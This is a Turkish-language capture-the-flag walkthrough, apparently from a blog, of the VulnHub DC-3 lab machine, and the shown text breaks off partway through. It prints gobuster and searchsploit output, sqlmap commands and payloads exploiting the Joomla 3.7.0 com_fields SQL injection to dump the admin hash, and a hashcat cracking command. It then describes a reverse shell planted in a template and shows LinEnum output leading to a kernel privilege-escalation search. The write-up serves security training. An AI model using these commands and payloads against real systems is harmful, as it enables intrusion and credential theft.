[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 13:46:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
===============================================================
2020/09/28 13:47:00 Finished
===============================================================
</code></pre><p>Web dizin taramasÄ±nda joomla uygulamasÄ±nÄ±n standart dosyalarÄ± dÄ±ÅŸÄ±nda bir dosya tespit edilememektedir.</p>
<p>http://192.168.56.111/administrator/manifests/files/joomla.xml adresine istek atÄ±lÄ±rak sÃ¼rÃ¼m bilgisi tespit edilir. SÃ¼rÃ¼mÃ¼n 3.7.0 olduÄŸu gÃ¶rÃ¼lmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
<span style="color:#f92672">&lt;extension</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.6&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;upgrade&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#f92672">&lt;name&gt;</span>files_joomla<span style="color:#f92672">&lt;/name&gt;</span>
	<span style="color:#f92672">&lt;author&gt;</span>Joomla! Project<span style="color:#f92672">&lt;/author&gt;</span>
	<span style="color:#f92672">&lt;authorEmail&gt;</span>admin@joomla.org<span style="color:#f92672">&lt;/authorEmail&gt;</span>
	<span style="color:#f92672">&lt;authorUrl&gt;</span>www.joomla.org<span style="color:#f92672">&lt;/authorUrl&gt;</span>
	<span style="color:#f92672">&lt;copyright&gt;</span>(C) 2005 - 2017 Open Source Matters. All rights reserved<span style="color:#f92672">&lt;/copyright&gt;</span>
	<span style="color:#f92672">&lt;license&gt;</span>GNU General Public License version 2 or later; see LICENSE.txt<span style="color:#f92672">&lt;/license&gt;</span>
	<span style="color:#f92672">&lt;version&gt;</span>3.7.0<span style="color:#f92672">&lt;/version&gt;</span>
	<span style="color:#f92672">&lt;creationDate&gt;</span>April 2017<span style="color:#f92672">&lt;/creationDate&gt;</span>
	<span style="color:#f92672">&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style="color:#f92672">&lt;/description&gt;</span>

	<span style="color:#f92672">&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style="color:#f92672">&lt;/scriptfile&gt;</span>

....
</code></pre></div><p>Joomla sÃ¼rÃ¼mÃ¼nÃ¼n gÃ¼ncel olmadÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Searchsploit ile exploit aramasÄ± yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit joomla 3.7
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                   | php/remote/44227.php
Joomla! 3.7.0 - <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection    | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Inject | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - | php/webapps/38445.txt
Joomla! Component Easydiscuss &lt; 4.0.21 - Cros | php/webapps/43488.txt
Joomla! Component J2Store &lt; 3.3.7 - SQL Injec | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - <span style="color:#e6db74">&#39;id&#39;</span> SQ | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3. | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Inj | php/webapps/42589.txt
---------------------------------------------- ---------------------------------
</code></pre></div><p>Ä°kinci sÄ±rada yer alan exploit -m parametresi ile indirilip incelenir. Uygulamada SqlInjection zafiyeti oluÄŸu gÃ¶rÃ¼lmektedir. Sqlmap aracÄ± kullanÄ±larak zafiyet sÃ¶mÃ¼rÃ¼lÃ¼r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
</code></pre></div><p>Ä°lk olarak veritabanlarÄ± tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div>
    <img src="/images/vulnhub/dc3/sqlmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Tespit edilen joomla veritabanÄ± seÃ§ilerek, veritabanÄ±nda yer alan tablolar tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb --tables -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+
</code></pre></div><p>Joomla veritabanÄ±nda yer alan <em><strong>#__users</strong></em> tablosunda yer alan kolonlar tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> --columns -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | numeric     |
| name     | non-numeric |
| password | non-numeric |
| email    | non-numeric |
| params   | non-numeric |
| username | non-numeric |
+----------+-------------+
</code></pre></div><p>Tablodaki username,password ve email sutunlarÄ±nda yer alan bilgiler dump edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> -C username,password,email --dump -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Database: joomladb
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+--------------------------+
| username | password                                                     | email                    |
+----------+--------------------------------------------------------------+--------------------------+
| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | freddy@norealaddress.net |
+----------+--------------------------------------------------------------+--------------------------+
</code></pre></div><p>Admin kullanÄ±cÄ±sÄ±na ait hash bilgisi elde edilmektedir. Elde edilen hash bilgisi hashcat aracÄ± ile sÃ¶zlÃ¼k saldÄ±rÄ±sÄ± yapÄ±larak kÄ±rÄ±lÄ±r. Elde edilen hash tÃ¼rÃ¼ tespit edilir.</p>

    <img src="/images/vulnhub/dc3/hashcatt.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">3200</span> --force hash.txt /usr/share/wordlists/rockyou.txt 
</code></pre></div>
    <img src="/images/vulnhub/dc3/hashcat.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Admin kullancÄ±sÄ± ile sisteme giriÅŸ yapÄ±lÄ±r. Daha sonra template iÃ§erisinde yer alan protostar temasÄ±ndaki error.php dosyasÄ± reverse shell alacak ÅŸekilde dÃ¼zenlenir.</p>

    <img src="/images/vulnhub/dc3/login.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em>http://192.168.56.111/template/protostar/error.php</em> adresine istek atÄ±larak ncat ile dinlenen porta baÄŸlantÄ± saÄŸlanÄ±lÄ±r.</p>
<p>
    <img src="/images/vulnhub/dc3/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


Python pty modulÃ¼ kullanÄ±larak etkileÅŸimli kabuÄŸa geÃ§ilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Yetki yÃ¼kseltmek iÃ§in LinEnum betiÄŸi kullanÄ±lÄ±rak sistem hakkÄ±nda bilgi toplanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#########################################################</span>
<span style="color:#75715e"># Local Linux Enumeration &amp; Privilege Escalation Script #</span>
<span style="color:#75715e">#########################################################</span>
<span style="color:#75715e"># www.rebootuser.com</span>
<span style="color:#75715e"># version 0.982</span>

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Debug Info
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Thorough tests <span style="color:#f92672">=</span> Disabled


Scan started at:
Tue Sep <span style="color:#ae81ff">29</span> 08:00:57 AEST <span style="color:#ae81ff">2020</span>


<span style="color:#75715e">### SYSTEM ##############################################</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information:
Linux DC-3 4.4.0-21-generic <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information <span style="color:#f92672">(</span>continued<span style="color:#f92672">)</span>:
Linux version 4.4.0-21-generic <span style="color:#f92672">(</span>buildd@lgw01-06<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc version 5.3.1 <span style="color:#ae81ff">20160413</span> <span style="color:#f92672">(</span>Ubuntu 5.3.1-14ubuntu2<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Specific release information:
DISTRIB_ID<span style="color:#f92672">=</span>Ubuntu
DISTRIB_RELEASE<span style="color:#f92672">=</span>16.04
DISTRIB_CODENAME<span style="color:#f92672">=</span>xenial
DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu&#34;</span>
VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04 LTS (Xenial Xerus)&#34;</span>
ID<span style="color:#f92672">=</span>ubuntu
ID_LIKE<span style="color:#f92672">=</span>debian
PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04&#34;</span>
HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.ubuntu.com/&#34;</span>
SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://help.ubuntu.com/&#34;</span>
BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bugs.launchpad.net/ubuntu/&#34;</span>
UBUNTU_CODENAME<span style="color:#f92672">=</span>xenial

<span style="color:#75715e">### USER/GROUP ##########################################</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Current user/group info:
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> It looks like we have some admin users:
uid<span style="color:#f92672">=</span>104<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,117<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,118<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Contents of /etc/passwd:
rootâŒ0:0:root:/root:/bin/bash
daemonâŒ1:1:daemon:/usr/sbin:/usr/sbin/nologin
binâŒ2:2:bin:/bin:/usr/sbin/nologin
sysâŒ3:3:sys:/dev:/usr/sbin/nologin
syncâŒ4:65534:sync:/bin:/bin/sync
gamesâŒ5:60:games:/usr/games:/usr/sbin/nologin
manâŒ6:12:man:/var/cache/man:/usr/sbin/nologin
lpâŒ7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mailâŒ8:8:mail:/var/mail:/usr/sbin/nologin
newsâŒ9:9:news:/var/spool/news:/usr/sbin/nologin
uucpâŒ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxyâŒ13:13:proxy:/bin:/usr/sbin/nologin
www-dataâŒ33:33:www-data:/var/www:/usr/sbin/nologin
backupâŒ34:34:backup:/var/backups:/usr/sbin/nologin
listâŒ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
ircâŒ39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnatsâŒ41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobodyâŒ65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesyncâŒ100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-networkâŒ101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolveâŒ102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxyâŒ103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslogâŒ104:108::/home/syslog:/bin/false
_aptâŒ105:65534::/nonexistent:/bin/false
lxdâŒ106:65534::/var/lib/lxd/:/bin/false
mysqlâŒ107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebusâŒ108:112::/var/run/dbus:/bin/false
uuiddâŒ109:113::/run/uuidd:/bin/false
dnsmasqâŒ110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshdâŒ111:65534::/var/run/sshd:/usr/sbin/nologin
dc3âŒ1000:1000:dc3,,,:/home/dc3:/bin/bash

<span style="color:#75715e">### ENVIRONMENTAL #######################################</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Environment information:
APACHE_PID_FILE<span style="color:#f92672">=</span>/var/run/apache2/apache2.pid
APACHE_RUN_USER<span style="color:#f92672">=</span>www-data
PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR<span style="color:#f92672">=</span>/var/log/apache2
PWD<span style="color:#f92672">=</span>/tmp
LANG<span style="color:#f92672">=</span>C
APACHE_RUN_GROUP<span style="color:#f92672">=</span>www-data
SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
APACHE_RUN_DIR<span style="color:#f92672">=</span>/var/run/apache2
APACHE_LOCK_DIR<span style="color:#f92672">=</span>/var/lock/apache2
_<span style="color:#f92672">=</span>/usr/bin/env

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Can we read/write sensitive files:
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1614</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/passwd
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">806</span> Apr <span style="color:#ae81ff">25</span> 16:26 /etc/group
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">575</span> Oct <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2015</span> /etc/profile
-rw-r----- <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">968</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/shadow

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SUID files:
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43316</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping6
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">157424</span> Mar <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /bin/ntfs-3g
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26492</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/umount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38900</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /bin/su
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30112</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /bin/fusermount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34812</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/mount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38932</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping
-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">105004</span> Mar <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> /usr/lib/snapd/snap-confine
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">13960</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38300</span> Mar  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2017</span> /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">513528</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> /usr/lib/openssh/ssh-keysign
-rwsr-xr-- <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">46436</span> Oct <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">5480</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">53128</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/passwd
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgidmap
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">78012</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/gpasswd
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">159852</span> May <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2017</span> /usr/bin/sudo
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18216</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/bin/pkexec
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">39560</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chsh
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">48264</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chfn
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newuidmap
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34680</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgrp
-rwsr-sr-x <span style="color:#ae81ff">1</span> daemon daemon <span style="color:#ae81ff">50748</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2016</span> /usr/bin/at

<span style="color:#75715e">### SCAN COMPLETE ####################################</span>
</code></pre></div><p>Kernel sÃ¼rÃ¼mÃ¼nÃ¼n eski olduÄŸu gÃ¶rÃ¼lmektedir. Ä°lk olarak Dirty-COW adÄ± verilen zafiyet ile yetki yÃ¼kseltilmeye Ã§alÄ±ÅŸÄ±lmÄ±ÅŸtÄ±r. Ancak www-data kullanÄ±cÄ±sÄ± login iÅŸlemine kapalÄ± olduÄŸundan /etc/passwd Ã¼zerinde yapÄ±lan her deÄŸiÅŸiklikten sonra sistem crash olmuÅŸtur.</p>
<p><em>Linux Kernel 4.4.x Ã§ekirdeÄŸine sahip Ubuntu 16.x sisteminde â€œLinux Kernel 4.4.x (Ubuntu 16.04) â€“ â€˜double-fdput()â€™ bpf(BPF_PROG_LOAD) Privilege Escalationâ€ isimli CVE-2016-4557 IDâ€™li kritik bir zafiyet bulunmaktadÄ±r.</em> Searchsploit Ã¼zerinde arama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit Linux Kernel 4.4.x
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 4.4.x <span style="color:#f92672">(</span>Ubuntu 16.04<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;double-fdput()&#39;</span> bpf<span style="color:#f92672">(</span>BPF_PROG_LOAD<span style="color:#f92672">)</span> Privilege Escalat | linux/local/39772.txt
</code></pre></div><p>Searchsploit Ã¼zerinden exploit bilgisayara indirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m <span style="color:#ae81ff">39772</span>
</code></pre></div><p>Ä°ndirilen exploit dosyasÄ± localhosttan hedef makinaya indirilir. Daha sonra zip ve tar arÅŸiv dosyalarÄ± Ã§Ä±karÄ±lÄ±r.</p>
